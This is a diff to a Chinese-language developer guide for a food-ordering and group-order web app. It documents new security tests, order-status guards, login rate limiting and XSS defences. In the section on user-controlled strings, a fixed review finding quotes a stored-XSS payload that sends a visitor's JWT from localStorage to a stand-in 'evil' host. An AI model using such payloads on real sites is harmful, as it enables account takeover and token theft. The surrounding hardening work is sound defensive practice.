@@ -178,6 +178,14 @@ permitAll，導致 `PUT /api/stores/update` 對外開放且可竄改任意分店
 | `ItemSpecResolverTest`（7） | 固定規格防竄改（見下方「品項規則抽在 service/order/」）|
 | `ItemHashTest`（6） | 品項識別碼：配料順序不影響合併、套券的那杯要拆開 |
 | `CouponEligibilityTest`（6） | 優惠券適用範圍、已付款不可套券 |
+| `MemberCancelSettlementTest`（9） | 團員取消品項的退款規則：只有真的付過（PAID／ESCROWED）才會退，且以 `escrowAmount` 為上限 |
+| `OrderStatusGuardTest`（5） | 顧客端狀態轉換白名單（`OPEN\|SUBMITTED → CANCELLED`、`SUBMITTED → PAID`）|
+| `SafeImageUrlTest`（7） | 圖片網址白名單：擋 `x" onerror=…`、`javascript:`、`../`、控制字元 |
+| `SafeTextTest`（6） | 會顯示給他人看的名稱：拒絕 `< > " \`` 與控制字元、上限 30 字；第三方登入名稱只清理、不拒絕 |
+| `CancellableStatusTest`（2） | 揪團品項可否取消：只有 OPEN、SUBMITTED（大小寫與空白不敏感） |
+| `LoginAttemptLimiterTest`（8） | 登入／OTP 滑動視窗限流，Redis 不可用時退回本地計數 |
+| `AuthServiceSmsModeGuardTest`（6） | prod profile 下 `sms.mode` 不是 firebase 就拒絕（含 `MOCK_TOKEN` 分支）|
+| `DemoDataSeederProdGuardTest`（2） | prod profile 不植入示範帳號，即使 `DEMO_DATA_ENABLED=true` |
 | `TxDisplayTest`（7） | 帳本種類正規化：舊的「標題\n說明」格式要能拆回兩欄、補款靠正負號分辨收付方 |
 | `ImageStorageServiceTest`（4） | 無 Cloudinary 憑證時改走本機儲存、同 publicId 覆寫、可疑副檔名正規化 |
 | `RatingConcurrencyTest`（2） | 併發評分不得死鎖、門市則數與平均分數要對得起來 |
@@ -185,7 +193,8 @@ permitAll，導致 `PUT /api/stores/update` 對外開放且可竄改任意分店
 | `GroupCheckoutConcurrencyTest`（6） | 揪團四條金流路徑重複觸發時只能發生一次；同一張券不可用兩次 |
 | `DemoApplicationTests`（1） | Spring context 能否載入 |
 
-`ItemSpecResolverTest` / `ItemHashTest` / `CouponEligibilityTest` 在 `service/order/`、`TxDisplayTest` 在 `service/wallet/`，
+`ItemSpecResolverTest` / `ItemHashTest` / `CouponEligibilityTest` / `MemberCancelSettlementTest` / `OrderStatusGuardTest`
+在 `service/order/`，`TxDisplayTest` 在 `service/wallet/`，`SafeImageUrlTest` / `DemoDataSeederProdGuardTest` 在 `common/`，
 是**不載入 Spring context** 的純邏輯測試（合計 0.05 秒）。
 新增純規則時請放在那裡，不要為了測一條規則去啟整個 context。
 
@@ -208,6 +217,34 @@ node ui/run-all.js      # 51 頁普掃 + 點餐／轉盤／揪團三條主線（
 `.github/workflows/ci.yml` 會依序跑完這三層。**改完動到序列化、交易邊界或前端流程的
 程式碼後，請至少跑一次第二三層**——九次 `LazyInitializationException` 裡有兩次
 （下單完成頁、揪團成員清單）是單獨 curl 端點會過、實際走流程才炸的。
+
+## ⚠️ 使用者可控字串：寫入端白名單、輸出端轉義
+
+`stores.store_name` / `cover_url`、商品 `logo_url`、`users.name`、品項／訂單備註都是店家或顧客
+自己寫進去的資料，而前端大量用 `innerHTML` 拼字串。這條路徑曾完全沒有防護：任何 BRAND 帳號
+（`POST /api/brand-auth/register` 是公開端點，不需驗證）把封面設成
+`x" onerror="fetch('https://evil/?t='+localStorage.getItem('token'))`，就能在每一位訪客的首頁
+執行它（JWT 就放在 `localStorage`）；顧客把名字改成 `<img src=x onerror=…>` 也能對門市後台做同樣的事
+（2026-10-11 複審的 X-1／X-2，已修）。
+
+- **寫入端**：圖片網址一律過 `common/SafeImageUrl.normalize()`——只允許 `http(s)://` 或單層
+  `/…` 站內路徑，含 `"`、`'`、`<`、`>`、空白或控制字元一律 400。接到門市封面、品牌 logo、
+  商品 logo、會員頭像四個寫入點；新增 `*Url` 欄位時請照做。
+- **輸出端**：每個頁面／每支 store JS 都有自己的區域 `escapeHtml`（沿用 `Brand/js/hq-menu-api.js`
+  的實作，不新增共用模組以免動到離線載入順序）。任何插進 HTML 的值都要先過它，包含屬性值。
+- **不要**把資料拼進 `onclick="fn('…')"` 這種 JS 字串：只換單引號擋不住結尾是反斜線的字串，
+  同一層還是 HTML。改用 `addEventListener` 或 `data-*` + 事件代理傳值。
+- **inline script 要另驗語法**：`node scripts/ui/check-inline-scripts.js [file.html…]`（不帶參數
+  就掃 `frontend/` 下所有 HTML）；`node --check` 只看得到獨立 `.js`，看不到寫在 HTML 裡的程式碼。
+- **防禦的另一層**：`SecurityConfig` 現在有 `X-Content-Type-Options`/`frame-ancestors 'none'`/
+  `Referrer-Policy`/`Permissions-Policy`/HSTS，CSP 由 `app.security.csp.enabled`（**預設 false**）
+  與 `app.security.csp.policy` 控制，由 `common/SecurityHeadersFilter` 加上；要真的收緊
+  `script-src` 得先把 inline event handler 外部化，否則只能整頁破相。
+
+其他本輪一起補的防呆：登入／OTP 端點走 `service/LoginAttemptLimiter`（`check(scope, identity)`，
+Redis 不可用時退回本地計數，預設 10 次／300 秒，超過回 429）；prod profile 下 `sms.mode` 非 `firebase`
+直接拒絕啟動，`MOCK_TOKEN` 只在非 prod 生效，`DemoDataSeeder` 在 prod 一律不植入
+（比照 `JwtUtils.assertProductionSecret`）；`PUT /api/stores/status` 只接受 `active` / `closed`。
 
 ## 資料庫（26 張表）
 
@@ -241,6 +278,12 @@ OPEN → SUBMITTED → PREPARING → READY → COMPLETED
 SUBMITTED 進入 PREPARING。
 
 揪團流程：揪團主建立 → 產生 token → 其他人用 token 加入 → 揪團主統一提交
+
+⚠️ **顧客只能走 `service/order/OrderStatusGuard` 允許的轉換**（`OPEN\|SUBMITTED → CANCELLED`、
+`SUBMITTED → PAID`，後者是舊前端「已付款」通知）。`OrderController` 的狀態端點原本只驗
+「是不是發起人」就 `setStatus`，任何登入者都能把訂單直接改成 `COMPLETED`（拿去評分）、
+把已結帳的 `SUBMITTED` 改回 `OPEN`（重新開放加點再結一次）或偽造付款狀態。
+門市端的 `acceptOrder` / `completeProduction` / `finalizeOrder` 本來就有各自的守衛，不要動。
 
 ## 錢包/支付邏輯
 
@@ -302,7 +345,7 @@ Hibernate 仍回傳快取中那個「上鎖之前」的實例——餘額是舊�
 | 補款 `repayToHost` | 同團員結帳（狀態帶 UNPAID/ESCROWED）| 扣了 175 |
 | 取消退款 `handleGroupOrderCancellation` | `GroupOrderRepository.findByIdForUpdate` ＋ `findByGroupOrderIdForUpdate` | escrow 退了 280 |
 
-`GroupCheckoutConcurrencyTest`（5 個）守住這四條。
+`GroupCheckoutConcurrencyTest`（6）守住這四條。
 
 ### ⚠️ 評分彙總：先鎖門市列，且彙總要用單一 SQL
 
@@ -528,3 +571,16 @@ Material Symbols 都已收進 `frontend/vendor/`（`scripts/vendor-assets.sh` �
 - `order_reviews` 表與 Entity 已從程式碼移除，評分統一使用 `order_ratings`
 - 轉盤實際路由為 `/api/coupons/spin`（執行）、`/api/coupons/spin-status`（狀態查詢），品牌列表為 `/api/game-wheel/brands`，**非** `/api/daily-spin/*`
 - GroupOrder V2 刪除路由為 `/api/group-orders/token/{token}`（加 `token/` 前綴），`/api/group-orders/{token}` 為 GET 查詢
+
+
+## 2026-10-11 第二輪複查後新增的不變量
+
+- **第三方登入的新帳號只能經 `POST /api/auth/social-signup` 建立**（先驗證手機 OTP，再建立帳號）。`socialLogin` 不得再以請求中未驗證的 `phone` 寫入使用者；全新手機會回 201，前端導向 `verify-phone.html?type=social-signup`。
+- **`PUT /api/auth/update` 不接受改手機**。手機是登入與重設密碼的依據，必須經 Firebase 手機驗證，不可在沒有 OTP 的端點直接改。`UserService.registerUser` 已移除（無呼叫者，且會接受未驗證手機）。
+- **取消揪團品項或整單時，取得列鎖後必須再用 `OrderStatusGuard.isOpenOrSubmitted` 檢查狀態**。控制器在鎖外做的檢查無法保證當下仍是 OPEN／SUBMITTED。
+- **`POST /api/orders/{orderId}/cancel` 走 `GroupOrderService.cancelAsInitiator`**（列鎖、退款、還原券，與 `cancel/v2` 相同）。`OrderService.cancelOrder` 已移除，它不退款、也不還原優惠券。
+- **結帳通知所需的門市 id 與總額由 `GroupOrderService.getCheckoutNotifyInfo` 在交易內取得**，控制器不得拿 entity 出去再 `getStore()`。`paymentMethod` 必須是 `WALLET` 或 `CASH`，否則回 400。
+- **使用者可控名稱的寫入規則在 `common/SafeText`**：自己送來的值用 `normalizeDisplayName`（不合規回 400）；第三方登入帶來的名稱用 `sanitizeDisplayName`（清理、截斷、不失敗）。
+- **前端含 HTML 的模板字串中插入名稱類欄位，一律以頁面內的轉義函式包住**（自動規則注入的是 `escHtmlSafe`，既有頁面用 `esc`／`escapeHtml`）。**不要對已在來源處轉義的變數再轉義一次**，否則會顯示成 `&amp;`。
+- **`onclick="…${值}…"` 的 JS 字串內不得插入名稱類資料**：HTML 轉義不能防止字串跳脫。改用 `data-*` 屬性，由事件函式讀取 `dataset`（見 `profile.html` 的 `editExtraAddressFromEl`）。
+- **`permitAll` 一律指定 HTTP method**（`SecurityConfig`）。`/api/stores/auth/**` 只開放 POST，`/api/menu/**`、`/api/home/**`、`/api/location/**`、`/api/group-orders/join/**` 等只開放 GET；WebSocket 的 `/ws/**`、`/ws-cart/**` 例外，因為 SockJS 會用到多種方法。
